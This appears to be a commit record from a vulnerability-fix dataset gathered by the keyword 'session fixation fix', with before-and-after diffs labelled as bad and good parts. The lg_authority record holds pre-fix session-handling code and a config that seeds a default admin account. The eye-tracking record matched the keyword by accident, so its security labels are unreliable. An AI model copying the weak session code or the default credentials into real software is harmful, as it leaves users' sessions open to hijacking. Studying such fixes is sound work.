(not openid\n    #users) will be prompted.\n    ,\n    'site_admin_login_window': 120\n    #Seconds after reauthentication that the administrative window closes.\n    #Used for things like changing the user's password or adding a new \n    #e-mail address.\n    ,\n    'site_storage': 'ram'\n    #The storage backend for the auth framework.  Essentially, we use \n    #a namespaced key-value store with expiration times on the namespaces for\n    #our general framework storage.\n    ,\n    'site_storage_conf': {\n        }\n    #Configuration options for the specified site storage.\n    ,\n    'site_storage_sections_user': {\n        'index_lists':  [ 'auth_openid', 'groups', 'emails' ]\n        }\n    #Configuration items for various sections of slates.\n    #Just replace \"_user\" with \"_{section name}\" to set up config.\n    #Most sections do not need any options, but if you want anything\n    #indexed, or admin-editable, then this is where you specify it.\n    ,\n    'site_storage_sections_session': {\n        'cache': [ 'auth', 'authtime', 'authtime_admin' ]\n        }\n    #Session vars to be cached at first read.\n    ,\n    'site_storage_clean_freq': 60\n    #Minutes between cleaning up expired site storage.\n    ,\n    'site_email': {\n        'smtpserver': '127.0.0.1'\n        ,'smtpport': 25\n        ,'smtpssl': False\n        ,'smtpuser': None\n        ,'smtppass': None\n        ,'default': 'Site <test@example.com>'\n        }\n    #Not *strictly* required (set to None for no email), but enables\n    #functionality like e-mail registration and forgot password resets via\n    #email.\n    ,\n    'site_template': None#default_template\n    #The template used to render the authroot forms.  If this is a function,\n    #it will be called with the internal HTML for that particular form as\n    #an argument.  If this is a two-member array, then the form content\n    #is placed firmly in the middle.\n    ,\n    'site_user_list': {\n        'admin': {\n            'auth_password': { 'date': datetime.datetime.utcnow(), 'pass': [ 'sha256', ['bff74028f285748241375d1c9c7f9b6e85fd3900edf8e601a78f7f84d848b42e', 'admin'] ] }\n            ,'auth_openid': []\n            ,'groups': [ 'admin' ]\n            }\n        }\n    #User records to create if they do not already exist\n    ,\n    'site_group_list': {\n        'admin': { 'name': 'Administrators' }\n        }\n    #Group records to create if they do not already exist.  \n    #any, auth, and user- groups are automatic.\n    ,\n    'site_registration': 'email'\n    #The required USER-SIDE registration mechanism.  All registration mechanisms use\n    #recaptcha if it is installed.\n    #Accepted values are:\n    #open - Anyone passing recaptcha may make a valid account, no confirmation\n    #    is necessary.\n    #email - Email based registration (optionally w\/ recaptcha).  \n    #    See site_email_ settings.\n    #admin - A user will define their account (optionally with recaptcha), but \n    #    an admin must sign off on it.\n    #None - Users will be redirected to the login page if their openID\n    #    fails, and the New Account link will be replaced with text asking\n    #    users who feel they should have permission to contact the \n    #    administrator.\n    ,\n    'site_registration_conf': {\n        'subject': email_reg_default_subject\n        ,'body': email_reg_default_body\n        #,'from': 'Site Registration <test@example.com>' Optional; if not\n        #specified, will use the site_email's 'default' parameter\n        }\n    #Config items for the specific \n    ,\n    'site_registration_timeout': 2\n    #The number of days between which a registration request is placed and \n    #expires.  For open or None, this is irrelevant.  For email, it refers to\n    #the time window that the user has to receive the activation email and\n    #activate their account.  For admin, this value IS NOT USED.\n    ,\n    'site_registration_recaptcha': {\n        'public': None\n        ,'private': None\n        }\n    #Your public and private keys for recaptcha, or None to disable recaptcha\n    ,\n    'site_debug': False\n    #Print debug messages for lg_authority?  True\/False\n    ,\n    'override_sessions': True\n    #Use Slates instead of sessions.  This defaults to True, but you might\n    #want to set it to false if you typically set properties in \n    #cherrypy.session WITHOUT setting them directly (e.g. \n    #a = MyClass();\n    #cherrypy.session['var'] = a\n    #a.data = 6 #THIS WILL NOT BE SAVED WITH SITE_OVERRIDE_SESSIONS AS TRUE\n    #\n    #If you use an app that does this, feel free to set its specific \n    #configuration to override_sessions: False\n    ,\n    'session_timeout': 60\n    #Minutes until a session expires; applicable only if override_sessions is\n    #True.\n    ,\n    'session_cookie': 'session_id'\n    #The cookie value used to read the session id.  Applicable only if \n    #override_sessions is True.\n    ,\n    'user_slate_section': 'userslate'\n    #The prefix for named slates for each user (only applicable when using\n    #lamegame_cherrypy_slates).  Can be overridden at different paths to \n    #\"isolate\" user storage.  Don't use any of the existing ones.\n    ,\n    'groups': [ 'any' ]\n    #Static groups allowed to access the resource.  If the FIRST ELEMENT\n    #of the array is 'all:', then the user must be in EVERY group specified\n    #to gain access.  Otherwise, if the user matches a single group, they\n    #will be allowed access.  This convention is ugly, but prevents errors\n    #when a site might wish to use both AND and OR group configurations\n    #in the same environment.\n    #\n    #Special groups:\n    #'any' means everyone, even unauthenticated users\n    #'auth' means all authenticated users\n    #'user-' + username means specifically (and only) username\n    ,\n    'user_home_page': '..'\n    #The page to redirect to (if relative, then from AuthRoot\/OneLevel\/)\n    #on successful authentication when a redirect action was not requested.\n    #May be a function that returns a URL; that function may use cherrypy.user\n    #to determine the user's identity.\n    ,\n    'logout_page': '..'\n    #Page to redirect to on logout.  Use None to show a standard auth\n    #page confirming the logout.\n    ,\n    'deny_page_anon': '\/auth\/login'\n    #Page that unauthorized users are sent to when trying to access a\n    #resource they cannot retrieve AND are not authenticated.  \n    #Use None for a standard \"Access Denied\" page.\n    #\n    #If the path starts with '\/auth\/', then site_auth_root will be substituted.\n    #\n    #deny_page_anon may be pointed to a login page.\n    ,\n    'deny_page_auth': None\n    #Page that unauthorized users are sent to when trying to access a\n    #resource they cannot retrieve AND are already authenticated.\n    #Use None for a standard \"Access Denied\" page.\n    })\n\n"},"\/lg_authority\/slates\/__init__.py":{"changes":[{"diff":"\n import cherrypy\n from ..common import *\n from .slates import Slate\n-from .session import init_session\n+from .session import init_session, send_session_cookie\n \n #Seed global config with Slate variable\n config.Slate = Sla","add":1,"remove":1,"filename":"\/lg_authority\/slates\/__init__.py","badparts":["from .session import init_session"],"goodparts":["from .session import init_session, send_session_cookie"]},{"diff":"\n import cherrypy\n from ..common import *\n from .slates import Slate\n-from .session import init_session\n+from .session import init_session, send_session_cookie\n \n #Seed global config with Slate variable\n config.Slate = Sla","add":1,"remove":1,"filename":"\/lg_authority\/slates\/__init__.py","badparts":["from .session import init_session"],"goodparts":["from .session import init_session, send_session_cookie"]}],"source":"\n\"\"\"LameGame Productions' cherrypy slates tool. Usage: Put tools.lg_slates.on=True in the[global] section in your config file to enable this tool. tools.lg_slates.storage_type may be specified to change the storage medium(defaults to 'ram' for RamStorage) \"\"\" __all__=[ 'Slate', 'init_session'] __author__='Walt Woods' import cherrypy from..common import * from.slates import Slate from.session import init_session config.Slate=Slate ","sourceWithComments":"\"\"\"LameGame Productions' cherrypy slates tool.\n\nUsage: Put tools.lg_slates.on = True in the [global] section in your config file to enable this tool.\n\ntools.lg_slates.storage_type may be specified to change the storage medium (defaults to 'ram' for RamStorage)\n\"\"\"\n\n__all__ = [ 'Slate', 'init_session' ]\n__author__ = 'Walt Woods'\n\nimport cherrypy\nfrom ..common import *\nfrom .slates import Slate\nfrom .session import init_session\n\n#Seed global config with Slate variable\nconfig.Slate = Slate\n\n"},"\/lg_authority\/slates\/session.py":{"changes":[{"diff":"\n     # the requested session data.\n     cherrypy.serving.session = sess = Session(id, **kwargs)\n     \n+def send_session_cookie(\n+    session_path=None\n+    , session_path_header=None\n+    , session_domain=None\n+    , session_secure=False\n+    , session_httponly=True\n+    , session_persistent=True\n+    , **kwargs\n+    ):\n+    \"\"\"Send the session cookie after the body in case the request\n+    regenerated the session id and it needs to be retransmitted.\n+    \"\"\"\n+    sess = cherrypy.serving.session\n     if sess.is_response_cookie_needed():\n+        session_cookie = kwargs.get('session_cookie', Session.session_cookie)\n+        cookie_timeout = kwargs.get('session_timeout', Session.timeout)\n         if not session_persistent:\n             # See http:\/\/support.microsoft.com\/kb\/223799\/EN-US\/\n             # and http:\/\/support.mozilla.com\/en-US\/kb\/Cookies\n             cookie_timeout = None\n         set_response_cookie(\n           path=session_path, path_header=session_path_header\n-          , name=name\n+          , name=session_cookie\n           , timeout=cookie_timeout\n           , domain=session_domain\n           , secure=session_sec","add":16,"remove":1,"filename":"\/lg_authority\/slates\/session.py","badparts":["          , name=name"],"goodparts":["def send_session_cookie(","    session_path=None","    , session_path_header=None","    , session_domain=None","    , session_secure=False","    , session_httponly=True","    , session_persistent=True","    , **kwargs","    ):","    \"\"\"Send the session cookie after the body in case the request","    regenerated the session id and it needs to be retransmitted.","    \"\"\"","    sess = cherrypy.serving.session","        session_cookie = kwargs.get('session_cookie', Session.session_cookie)","        cookie_timeout = kwargs.get('session_timeout', Session.timeout)","          , name=session_cookie"]},{"diff":"\n     # the requested session data.\n     cherrypy.serving.session = sess = Session(id, **kwargs)\n     \n+def send_session_cookie(\n+    session_path=None\n+    , session_path_header=None\n+    , session_domain=None\n+    , session_secure=False\n+    , session_httponly=True\n+    , session_persistent=True\n+    , **kwargs\n+    ):\n+    \"\"\"Send the session cookie after the body in case the request\n+    regenerated the session id and it needs to be retransmitted.\n+    \"\"\"\n+    sess = cherrypy.serving.session\n     if sess.is_response_cookie_needed():\n+        session_cookie = kwargs.get('session_cookie', Session.session_cookie)\n+        cookie_timeout = kwargs.get('session_timeout', Session.timeout)\n         if not session_persistent:\n             # See http:\/\/support.microsoft.com\/kb\/223799\/EN-US\/\n             # and http:\/\/support.mozilla.com\/en-US\/kb\/Cookies\n             cookie_timeout = None\n         set_response_cookie(\n           path=session_path, path_header=session_path_header\n-          , name=name\n+          , name=session_cookie\n           , timeout=cookie_timeout\n           , domain=session_domain\n           , secure=session_sec","add":16,"remove":1,"filename":"\/lg_authority\/slates\/session.py","badparts":["          , name=name"],"goodparts":["def send_session_cookie(","    session_path=None","    , session_path_header=None","    , session_domain=None","    , session_secure=False","    , session_httponly=True","    , session_persistent=True","    , **kwargs","    ):","    \"\"\"Send the session cookie after the body in case the request","    regenerated the session id and it needs to be retransmitted.","    \"\"\"","    sess = cherrypy.serving.session","        session_cookie = kwargs.get('session_cookie', Session.session_cookie)","        cookie_timeout = kwargs.get('session_timeout', Session.timeout)","          , name=session_cookie"]}],"source":"\n\"\"\"The session functionality of lg_authority\/slates. \"\"\" import os import datetime import time import binascii from cherrypy.lib import httputil import cherrypy from..common import * from.slates import Slate class Session(Slate): \"\"\"A container that maps session ID's to an underlying slate.\"\"\" session_cookie='session_id' session_cookie__doc=\"\"\"Name of cookie where session id is stored\"\"\" timeout=60 timeout__doc=\"\"\"Timeout(in minutes) until session expiration\"\"\" originalid=None originalid__doc=\"\"\"Client-sent identifier for the session slate\"\"\" def __init__(self, id=None, **kwargs): self.timeout=kwargs.pop('session_timeout', Session.timeout) * 60 self.session_cookie=kwargs.get('session_cookie', self.session_cookie) self.originalid=id self.id=id self._test_id() if not self.is_expired(): ttl=self.time_to_expire() if ttl < self.timeout \/\/ 2 or ttl < self.timeout -60*60: self.touch() self._update_cookie=True def is_response_cookie_needed(self): return True if self.id !=self.originalid: return True if hasattr(self, '_update_cookie'): return True return False def expire(self): \"\"\"Expires the session both client-side and slate-side\"\"\" Slate.expire(self) one_year=60 * 60 * 24 * 365 e=time.time() -one_year cherrypy.serving.response.cookie[self.session_cookie]='expired' cherrypy.serving.response.cookie[self.session_cookie]['expires']=httputil.HTTPDate(e) def _test_id(self): \"\"\"Test if we are expired. If we are, assign a new id\"\"\" new_timeout=self.timeout Slate.__init__( self , 'session' , self.id , timeout=new_timeout , force_timeout=True ) if self.is_expired(): while True: self.id=self._generate_id() Slate.__init__(self, 'session', self.id, timeout=new_timeout) if self.is_expired(): break log('Session{0} expired ->{1}'.format(self.originalid, self.id)) def _generate_id(self): \"\"\"Return a new session id.\"\"\" return binascii.hexlify(os.urandom(20)).decode('ascii') def init_session( session_path=None , session_path_header=None , session_domain=None , session_secure=False , session_httponly=True , session_persistent=True , **kwargs ): \"\"\"Initialize session object(using cookies). Attached to before_request_body. session_path: the 'path' value to stick in the response cookie metadata. session_path_header: if 'path' is None(the default), then the response cookie 'path' will be pulled from request.headers[path_header]. session_cookie: the name of the cookie. session_timeout: the expiration timeout(in minutes) for the stored session data. If 'persistent' is True(the default), this is also the timeout for the cookie. session_domain: the cookie domain. session_secure: if False(the default) the cookie 'secure' value will not be set. If True, the cookie 'secure' value will be set(to 1). session_httponly: If True(the default) the cookie 'httponly' value will be set, which prevents client scripts from reading the cookie. This helps to guard against XSS. session_persistent: if True(the default), the 'timeout' argument will be used to expire the cookie. If False, the cookie will not have an expiry, and the cookie will be a \"session cookie\" which expires when the browser is closed. Any additional kwargs will be bound to the new Session instance, and may be specific to the storage type. See the subclass of Session you're using for more information. \"\"\" if hasattr(cherrypy.serving, \"session\"): return request=cherrypy.serving.request name=session_cookie=kwargs.get('session_cookie', Session.session_cookie) cookie_timeout=kwargs.get('session_timeout', Session.timeout) id=None if session_cookie in request.cookie: id=request.cookie[session_cookie].value log('ID obtained from request.cookie: %r' % id) else: log('New session(no cookie)') cherrypy.serving.session=sess=Session(id, **kwargs) if sess.is_response_cookie_needed(): if not session_persistent: cookie_timeout=None set_response_cookie( path=session_path, path_header=session_path_header , name=name , timeout=cookie_timeout , domain=session_domain , secure=session_secure , httponly=session_httponly ) def set_response_cookie(path=None, path_header=None, name='session_id', timeout=60, domain=None, secure=False, httponly=True): \"\"\"Set a response cookie for the client. path: the 'path' value to stick in the response cookie metadata. path_header: if 'path' is None(the default), then the response cookie 'path' will be pulled from request.headers[path_header]. name: the name of the cookie. timeout: the expiration timeout for the cookie. If 0 or other boolean False, no 'expires' param will be set, and the cookie will be a \"session cookie\" which expires when the browser is closed. domain: the cookie domain. secure: if False(the default) the cookie 'secure' value will not be set. If True, the cookie 'secure' value will be set(to 1). httponly: if True(the default) the cookie's 'httponly' value will be set, preventing client scripts from reading the cookie. Helps prevent XSS, see https:\/\/www.owasp.org\/index.php\/HttpOnly \"\"\" cookie=cherrypy.serving.response.cookie cookie[name]=cherrypy.serving.session.id cookie[name]['path']=(path or cherrypy.serving.request.headers.get(path_header) or '\/') if timeout: e=time.time() +(timeout * 60) cookie[name]['expires']=httputil.HTTPDate(e) if domain is not None: cookie[name]['domain']=domain if secure: cookie[name]['secure']=1 if httponly: cookie[name]['httponly']=1 ","sourceWithComments":"\"\"\"The session functionality of lg_authority\/slates.\n\"\"\"\n\nimport os\nimport datetime\nimport time\nimport binascii\nfrom cherrypy.lib import httputil\nimport cherrypy\nfrom ..common import *\nfrom .slates import Slate\n\nclass Session(Slate):\n    \"\"\"A container that maps session ID's to an underlying slate.\"\"\"\n\n    session_cookie = 'session_id'\n    session_cookie__doc = \"\"\"Name of cookie where session id is stored\"\"\"\n\n    timeout=60\n    timeout__doc = \"\"\"Timeout (in minutes) until session expiration\"\"\"\n\n    originalid = None\n    originalid__doc = \"\"\"Client-sent identifier for the session slate\"\"\"\n\n    def __init__(self, id=None, **kwargs):\n        self.timeout = kwargs.pop('session_timeout', Session.timeout) * 60\n        self.session_cookie = kwargs.get('session_cookie', self.session_cookie)\n\n        self.originalid = id\n        self.id = id\n        #Check for expired session, and assign new identifier if\n        #necessary.  _test_id calls Slate.__init__\n        self._test_id()\n\n        if not self.is_expired():\n            #Check for the need to update the session's expiration date.\n            #Update if we're either halfway through our session timeout or\n            #at one hour intervals, whichever comes first.\n            #Remember that by this point, timeout is in seconds instead of\n            #minutes.\n            ttl = self.time_to_expire()\n            if ttl < self.timeout \/\/ 2 or ttl < self.timeout - 60*60:\n                self.touch()\n                self._update_cookie = True\n\n        #The response cookie is set in init_session(), at the bottom of this\n        #file.\n\n    def is_response_cookie_needed(self):\n        #Turns out, a lot of caching mechanisms determine whether to cache\n        #or not based on whether or not the response contains a cookie.\n        #It's best to always return one.\n        return True\n\n        if self.id != self.originalid:\n            return True\n        if hasattr(self, '_update_cookie'):\n            return True\n        return False\n\n    def expire(self):\n        \"\"\"Expires the session both client-side and slate-side\"\"\"\n        Slate.expire(self)\n\n        one_year = 60 * 60 * 24 * 365\n        e = time.time() - one_year\n        cherrypy.serving.response.cookie[self.session_cookie] = 'expired'\n        cherrypy.serving.response.cookie[self.session_cookie]['expires'] = httputil.HTTPDate(e)\n\n    def _test_id(self):\n        \"\"\"Test if we are expired.  If we are, assign a new id\"\"\"\n        #Force the session timeout to always update with the site's preferences.\n        new_timeout = self.timeout\n        Slate.__init__(\n            self\n            , 'session'\n            , self.id\n            , timeout=new_timeout\n            , force_timeout=True\n            )\n        if self.is_expired():\n            while True:\n                self.id = self._generate_id()\n                #We are looking for expired (non-existant) sessions, so no\n                #need to set force_timeout\n                Slate.__init__(self, 'session', self.id, timeout=new_timeout)\n                if self.is_expired():\n                    break\n            log('Session {0} expired -> {1}'.format(self.originalid, self.id))\n\n    def _generate_id(self):\n        \"\"\"Return a new session id.\"\"\"\n        return binascii.hexlify(os.urandom(20)).decode('ascii')\n    \ndef init_session(\n    session_path=None\n    , session_path_header=None\n    , session_domain=None\n    , session_secure=False\n    , session_httponly=True\n    , session_persistent=True\n    , **kwargs\n    ):\n    \"\"\"Initialize session object (using cookies).  \n    Attached to before_request_body.\n    \n    session_path: the 'path' value to stick in the response cookie metadata.\n    session_path_header: if 'path' is None (the default), then the response\n        cookie 'path' will be pulled from request.headers[path_header].\n    session_cookie: the name of the cookie.\n    session_timeout: the expiration timeout (in minutes) for the stored session \n        data. If 'persistent' is True (the default), this is also the timeout\n        for the cookie.\n    session_domain: the cookie domain.\n    session_secure: if False (the default) the cookie 'secure' value will not\n        be set. If True, the cookie 'secure' value will be set (to 1).\n    session_httponly: If True (the default) the cookie 'httponly' value will be\n        set, which prevents client scripts from reading the cookie.  This\n        helps to guard against XSS.\n    session_persistent: if True (the default), the 'timeout' argument will be \n        used to expire the cookie. If False, the cookie will not have an expiry,\n        and the cookie will be a \"session cookie\" which expires when the\n        browser is closed.\n    \n    Any additional kwargs will be bound to the new Session instance,\n    and may be specific to the storage type. See the subclass of Session\n    you're using for more information.\n    \"\"\"\n    \n    # Guard against running twice\n    if hasattr(cherrypy.serving, \"session\"):\n        return\n    \n    request = cherrypy.serving.request\n    name = session_cookie = kwargs.get('session_cookie', Session.session_cookie)\n    cookie_timeout = kwargs.get('session_timeout', Session.timeout)\n    \n    # Check if request came with a session ID\n    id = None\n    if session_cookie in request.cookie:\n        id = request.cookie[session_cookie].value\n        log('ID obtained from request.cookie: %r' % id)\n    else:\n        log('New session (no cookie)')\n    \n    # Create and attach a new Session instance to cherrypy.serving.\n    # It will possess a reference to (and lock, and lazily load)\n    # the requested session data.\n    cherrypy.serving.session = sess = Session(id, **kwargs)\n    \n    if sess.is_response_cookie_needed():\n        if not session_persistent:\n            # See http:\/\/support.microsoft.com\/kb\/223799\/EN-US\/\n            # and http:\/\/support.mozilla.com\/en-US\/kb\/Cookies\n            cookie_timeout = None\n        set_response_cookie(\n          path=session_path, path_header=session_path_header\n          , name=name\n          , timeout=cookie_timeout\n          , domain=session_domain\n          , secure=session_secure\n          , httponly=session_httponly\n          )\n\n\ndef set_response_cookie(path=None, path_header=None, name='session_id',\n                        timeout=60, domain=None, secure=False, httponly=True):\n    \"\"\"Set a response cookie for the client.\n    \n    path: the 'path' value to stick in the response cookie metadata.\n    path_header: if 'path' is None (the default), then the response\n        cookie 'path' will be pulled from request.headers[path_header].\n    name: the name of the cookie.\n    timeout: the expiration timeout for the cookie. If 0 or other boolean\n        False, no 'expires' param will be set, and the cookie will be a\n        \"session cookie\" which expires when the browser is closed.\n    domain: the cookie domain.\n    secure: if False (the default) the cookie 'secure' value will not\n        be set. If True, the cookie 'secure' value will be set (to 1).\n    httponly: if True (the default) the cookie's 'httponly' value will be\n        set, preventing client scripts from reading the cookie.  Helps prevent\n        XSS, see https:\/\/www.owasp.org\/index.php\/HttpOnly\n    \"\"\"\n    # Set response cookie\n    cookie = cherrypy.serving.response.cookie\n    cookie[name] = cherrypy.serving.session.id\n    cookie[name]['path'] = (path or cherrypy.serving.request.headers.get(path_header)\n                            or '\/')\n    \n    # We'd like to use the \"max-age\" param as indicated in\n    # http:\/\/www.faqs.org\/rfcs\/rfc2109.html but IE doesn't\n    # save it to disk and the session is lost if people close\n    # the browser. So we have to use the old \"expires\" ... sigh ...\n##    cookie[name]['max-age'] = timeout * 60\n    if timeout:\n        e = time.time() + (timeout * 60)\n        cookie[name]['expires'] = httputil.HTTPDate(e)\n    if domain is not None:\n        cookie[name]['domain'] = domain\n    if secure:\n        cookie[name]['secure'] = 1\n    if httponly:\n        cookie[name]['httponly'] = 1\n\n"}},"msg":"Reconfigured sessions a bit - by default, persist the session.  Create a new session id if the session specified in the client's cookie is expired.  Touch the new session to make it persistent.  When a login information is transmitted, change the session id to prevent some types of session fixation."}},"https:\/\/github.com\/ltkhiem\/rckit":{"f5fc67e6098cf91fbe928c45ec0dd00992a746da":{"url":"https:\/\/api.github.com\/repos\/ltkhiem\/rckit\/commits\/f5fc67e6098cf91fbe928c45ec0dd00992a746da","html_url":"https:\/\/github.com\/ltkhiem\/rckit\/commit\/f5fc67e6098cf91fbe928c45ec0dd00992a746da","message":":bug: [Bug Fix] Blank fixation group and Invalid blink segments\n\nIgnore empty fixation groups. Blinks that fall outside of the session are ignored.","sha":"f5fc67e6098cf91fbe928c45ec0dd00992a746da","keyword":"session fixation fix","diff":"diff --git a\/__init__.py b\/__init__.py\nnew file mode 100644\nindex 0000000..e69de29\ndiff --git a\/ocular_movement_detection.py b\/ocular_movement_detection.py\nindex 15aa946..a71ad3d 100644\n--- a\/ocular_movement_detection.py\n+++ b\/ocular_movement_detection.py\n@@ -38,15 +38,18 @@ def _detect_fixations():\n         fixations = []\n         for fpogid, fpogs in fx_groups:\n             fpogs_valid = fpogs[fpogs['FPOGV'] == 1]\n+            if len(fpogs_valid) == 0: \n+                continue\n+\n             fxh = fpogs_valid['FPOGX'].mean()\n             fxv = fpogs_valid['FPOGY'].mean()\n             fxdur = fpogs_valid['FPOGD'].values[-1]\n-            fxtime = fpogs_valid['TIME'].values[0] - session_time\n+            fxtime = fpogs_valid['TIME'].values[0] - session_start_time\n \n+            # Checks\n             if th_fxdur is not None and fxdur * 1000 <= th_fxdur: \n                 # Fixation duration requirement not meet.\n                 continue\n-\n             if 0 <= fxh <= 1 and 0 <= fxv <= 1:\n                 # Only take fixation that is inside the screen.\n                 fixations.append([fxh, fxv, fxdur, fxtime])\n@@ -69,21 +72,18 @@ def _detect_saccades():\n             - scdur : duration in seconds of saccade.\n             - sctime : starting time in seconds since the start of the session. \n         \"\"\"\n-        print(fixations[0:4])\n         fxend = (fixations[:, 2] + fixations[:, 3]).reshape(-1,1)\n-        print(fxend[:4])\n         time_diff = (fixations[1:][:, 3] - fxend[:-1, 0]).reshape(-1,1)\n-        print(time_diff[:4])\n         saccades = np.concatenate([\n                 fixations[:-1][:, :2],  # start_x, start_y\n                 fixations[1:][:, :2],   # end_x, end_y\n                 time_diff,              # saccades duration\n-                fxend[:-1]               # saccades start will be end of last fixation\n+                fxend[:-1]              # saccades start will be end of last fixation\n             ], axis=1)\n         return saccades\n         ### Remove prints, add threshold ... \n \n-    def _detect_blink():\n+    def _detect_blinks():\n         \"\"\"\n         Take eye tracking data from outer function and perform detection.\n         Blinks that fall outside of a given threshold (if available) are eliminated.\n@@ -100,9 +100,22 @@ def _detect_blink():\n         bk_groups = df[df['BKID'] != 0].groupby(by=['BKID'])\n         for bkid, bk in bk_groups:\n             bktime = bk['TIME'].values[0] - session_start_time\n-            bkdur = df.iloc[bk.tail(1).index[0]+1]['BKDUR']\n+            # Blink duration is calculated after the blink is over. Hence, the duration\n+            # is available in the next data entry ...\n+            next_id = bk.tail(1).index[0]+1\n+            if next_id >= len(df):\n+                # Out of bound\n+                continue\n+ \n+            bkdur = df.iloc[next_id]['BKDUR']\n+\n+            # Checks\n+            if bkdur == 0:\n+                # Session is over before blink is over ... eliminate this\n+                continue\n             if th_bkdur is not None and not inside_th(th_bkdur, bkdur):\n                 continue\n+\n             blinks.append([bkdur, bktime])\n         blinks = np.array(blinks)\n         return blinks\n@@ -111,7 +124,7 @@ def _detect_blink():\n     session_start_time = df.iloc[0]['TIME']\n     fixations = _detect_fixations()\n     saccades = _detect_saccades()\n-    blinks = _detect_blink()\n+    blinks = _detect_blinks()\n     return fixations, saccades, blinks\n \n \n","files":{"\/ocular_movement_detection.py":{"changes":[{"diff":"\n         fixations = []\n         for fpogid, fpogs in fx_groups:\n             fpogs_valid = fpogs[fpogs['FPOGV'] == 1]\n+            if len(fpogs_valid) == 0: \n+                continue\n+\n             fxh = fpogs_valid['FPOGX'].mean()\n             fxv = fpogs_valid['FPOGY'].mean()\n             fxdur = fpogs_valid['FPOGD'].values[-1]\n-            fxtime = fpogs_valid['TIME'].values[0] - session_time\n+            fxtime = fpogs_valid['TIME'].values[0] - session_start_time\n \n+            # Checks\n             if th_fxdur is not None and fxdur * 1000 <= th_fxdur: \n                 # Fixation duration requirement not meet.\n                 continue\n-\n             if 0 <= fxh <= 1 and 0 <= fxv <= 1:\n                 # Only take fixation that is inside the screen.\n                 fixations.append([fxh, fxv, fxdur, fxtime])\n","add":5,"remove":2,"filename":"\/ocular_movement_detection.py","badparts":["            fxtime = fpogs_valid['TIME'].values[0] - session_time"],"goodparts":["            if len(fpogs_valid) == 0: ","                continue","            fxtime = fpogs_valid['TIME'].values[0] - session_start_time"]},{"diff":"\n             - scdur : duration in seconds of saccade.\n             - sctime : starting time in seconds since the start of the session. \n         \"\"\"\n-        print(fixations[0:4])\n         fxend = (fixations[:, 2] + fixations[:, 3]).reshape(-1,1)\n-        print(fxend[:4])\n         time_diff = (fixations[1:][:, 3] - fxend[:-1, 0]).reshape(-1,1)\n-        print(time_diff[:4])\n         saccades = np.concatenate([\n                 fixations[:-1][:, :2],  # start_x, start_y\n                 fixations[1:][:, :2],   # end_x, end_y\n                 time_diff,              # saccades duration\n-                fxend[:-1]               # saccades start will be end of last fixation\n+                fxend[:-1]              # saccades start will be end of last fixation\n             ], axis=1)\n         return saccades\n         ### Remove prints, add threshold ... \n \n-    def _detect_blink():\n+    def _detect_blinks():\n         \"\"\"\n         Take eye tracking data from outer function and perform detection.\n         Blinks that fall outside of a given threshold (if available) are eliminated.\n","add":2,"remove":5,"filename":"\/ocular_movement_detection.py","badparts":[" scdur : duration in seconds of saccade."," sctime : starting time in seconds since the start of the session. ","        print(fixations[0:4])","        print(fxend[:4])","        print(time_diff[:4])","                fxend[:-1]               # saccades start will be end of last fixation","    def _detect_blink():"],"goodparts":["                fxend[:-1]              # saccades start will be end of last fixation","    def _detect_blinks():"]},{"diff":"\n         bk_groups = df[df['BKID'] != 0].groupby(by=['BKID'])\n         for bkid, bk in bk_groups:\n             bktime = bk['TIME'].values[0] - session_start_time\n-            bkdur = df.iloc[bk.tail(1).index[0]+1]['BKDUR']\n+            # Blink duration is calculated after the blink is over. Hence, the duration\n+            # is available in the next data entry ...\n+            next_id = bk.tail(1).index[0]+1\n+            if next_id >= len(df):\n+                # Out of bound\n+                continue\n+ \n+            bkdur = df.iloc[next_id]['BKDUR']\n+\n+            # Checks\n+            if bkdur == 0:\n+                # Session is over before blink is over ... eliminate this\n+                continue\n             if th_bkdur is not None and not inside_th(th_bkdur, bkdur):\n                 continue\n+\n             blinks.append([bkdur, bktime])\n         blinks = np.array(blinks)\n         return blinks\n","add":14,"remove":1,"filename":"\/ocular_movement_detection.py","badparts":["            bkdur = df.iloc[bk.tail(1).index[0]+1]['BKDUR']"],"goodparts":["            next_id = bk.tail(1).index[0]+1","            if next_id >= len(df):","                continue","            bkdur = df.iloc[next_id]['BKDUR']","            if bkdur == 0:","                continue"]},{"diff":"\n     session_start_time = df.iloc[0]['TIME']\n     fixations = _detect_fixations()\n     saccades = _detect_saccades()\n-    blinks = _detect_blink()\n+    blinks = _detect_blinks()\n     return fixations, saccades, blinks\n \n \n","add":1,"remove":1,"filename":"\/ocular_movement_detection.py","badparts":["    blinks = _detect_blink()"],"goodparts":["    blinks = _detect_blinks()"]},{"diff":"\n         fixations = []\n         for fpogid, fpogs in fx_groups:\n             fpogs_valid = fpogs[fpogs['FPOGV'] == 1]\n+            if len(fpogs_valid) == 0: \n+                continue\n+\n             fxh = fpogs_valid['FPOGX'].mean()\n             fxv = fpogs_valid['FPOGY'].mean()\n             fxdur = fpogs_valid['FPOGD'].values[-1]\n-            fxtime = fpogs_valid['TIME'].values[0] - session_time\n+            fxtime = fpogs_valid['TIME'].values[0] - session_start_time\n \n+            # Checks\n             if th_fxdur is not None and fxdur * 1000 <= th_fxdur: \n                 # Fixation duration requirement not meet.\n                 continue\n-\n             if 0 <= fxh <= 1 and 0 <= fxv <= 1:\n                 # Only take fixation that is inside the screen.\n                 fixations.append([fxh, fxv, fxdur, fxtime])\n","add":5,"remove":2,"filename":"\/ocular_movement_detection.py","badparts":["            fxtime = fpogs_valid['TIME'].values[0] - session_time"],"goodparts":["            if len(fpogs_valid) == 0: ","                continue","            fxtime = fpogs_valid['TIME'].values[0] - session_start_time"]},{"diff":"\n             - scdur : duration in seconds of saccade.\n             - sctime : starting time in seconds since the start of the session. \n         \"\"\"\n-        print(fixations[0:4])\n         fxend = (fixations[:, 2] + fixations[:, 3]).reshape(-1,1)\n-        print(fxend[:4])\n         time_diff = (fixations[1:][:, 3] - fxend[:-1, 0]).reshape(-1,1)\n-        print(time_diff[:4])\n         saccades = np.concatenate([\n                 fixations[:-1][:, :2],  # start_x, start_y\n                 fixations[1:][:, :2],   # end_x, end_y\n                 time_diff,              # saccades duration\n-                fxend[:-1]               # saccades start will be end of last fixation\n+                fxend[:-1]              # saccades start will be end of last fixation\n             ], axis=1)\n         return saccades\n         ### Remove prints, add threshold ... \n \n-    def _detect_blink():\n+    def _detect_blinks():\n         \"\"\"\n         Take eye tracking data from outer function and perform detection.\n         Blinks that fall outside of a given threshold (if available) are eliminated.\n","add":2,"remove":5,"filename":"\/ocular_movement_detection.py","badparts":[" scdur : duration in seconds of saccade."," sctime : starting time in seconds since the start of the session. ","        print(fixations[0:4])","        print(fxend[:4])","        print(time_diff[:4])","                fxend[:-1]               # saccades start will be end of last fixation","    def 